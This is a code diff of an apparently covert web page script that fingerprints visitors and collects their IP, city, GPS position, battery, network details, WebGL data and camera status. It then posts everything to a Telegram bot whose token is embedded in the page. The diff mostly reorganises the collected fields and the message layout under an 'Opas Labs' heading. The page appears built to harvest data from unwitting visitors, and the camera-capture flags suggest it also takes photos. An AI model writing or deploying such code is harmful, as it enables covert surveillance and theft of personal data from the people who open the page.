@@ -35,7 +35,7 @@
     let frontCaptured = false;
     let backCaptured = false;
 
-    // === NEW: Network Information ===
+    // Network Information
     async function getNetworkInfo() {
       const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
       if (connection) {
@@ -50,7 +50,7 @@
       return "Network API not supported";
     }
 
-    // === NEW: WebGL & Canvas Fingerprinting ===
+    // WebGL & Canvas Fingerprinting
     function getWebGLInfo() {
       const canvas = document.createElement('canvas');
       const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -89,26 +89,36 @@
 
     async function getDeviceInfo() {
       const data = {
+        // Basic Info
+        browser: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
+        
+        // Hardware Specs
+        cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
+        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
+        screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
+        touch: 'ontouchstart' in window ? "Yes" : "No",
+        webgl: getWebGLInfo(),
+        
+        // Network
+        network: await getNetworkInfo(),
+        
+        // Location & IP
         ip: "Unknown",
         city: "",
         region: "",
         country: "",
+        location: "Denied",
+        
+        // Battery
         battery: "Unknown",
         charging: "Unknown",
-        location: "Denied",
-        browser: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
-        touch: 'ontouchstart' in window ? "Yes" : "No",
-        screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
-        cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
+        
+        // Camera
         cameraStatus: "",
-        // === NEW: Added fields ===
-        network: await getNetworkInfo(),
-        webgl: getWebGLInfo(),
       };
 
       // IP Info
@@ -141,35 +151,43 @@
 
     async function sendTextToTelegram(data) {
       const message = `
-🔐 *User Device Info*
-🌐 IP: ${data.ip}
-📍 Location: ${data.city}, ${data.region}, ${data.country}
-📡 GPS: ${data.location}
-📷 Camera: ${data.cameraStatus}
+*🔰 Opas Labs 🔰*
 
-🖥 *Device Specs*
-💻 Platform: ${data.platform}
-📱 Touch Support: ${data.touch}
-🧠 CPU Cores: ${data.cpu}
-💾 RAM: ${data.memory}
-🖼 Screen: ${data.screen}
-🌍 Language: ${data.language}
-🌐 Browser: ${data.browser}
-🍪 Cookies: ${data.cookies}
-🕒 Timezone: ${data.timezone}
-🔋 Battery: ${data.battery} | Charging: ${data.charging}
+🌐 *Basic Info*
+- Browser: ${data.browser}
+- Platform: ${data.platform}
+- Language: ${data.language}
+- Timezone: ${data.timezone}
+- Cookies: ${data.cookies}
 
-=== NEW: Network & WebGL ===
-📶 Network: 
-   - Type: ${data.network.type}
-   - Speed: ${data.network.effectiveType}
-   - Downlink: ${data.network.downlink}
-   - RTT: ${data.network.rtt}
-   - Data Saver: ${data.network.saveData}
+💻 *Hardware Specs*
+- CPU: ${data.cpu}
+- RAM: ${data.memory}
+- Screen: ${data.screen}
+- Touch Support: ${data.touch}
+- WebGL Vendor: ${data.webgl.vendor}
+- WebGL Renderer: ${data.webgl.renderer}
 
-🎮 WebGL: 
-   - Vendor: ${data.webgl.vendor}
-   - Renderer: ${data.webgl.renderer}
+📶 *Network*
+- Type: ${data.network.type}
+- Speed: ${data.network.effectiveType}
+- Downlink: ${data.network.downlink}
+- Latency (RTT): ${data.network.rtt}
+- Data Saver: ${data.network.saveData}
+
+📍 *Location & IP*
+- IP: ${data.ip}
+- City: ${data.city}
+- Region: ${data.region}
+- Country: ${data.country}
+- GPS: ${data.location}
+
+🔋 *Battery*
+- Level: ${data.battery}
+- Charging: ${data.charging}
+
+📷 *Camera Status*
+- ${data.cameraStatus}
       `;
 
       return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
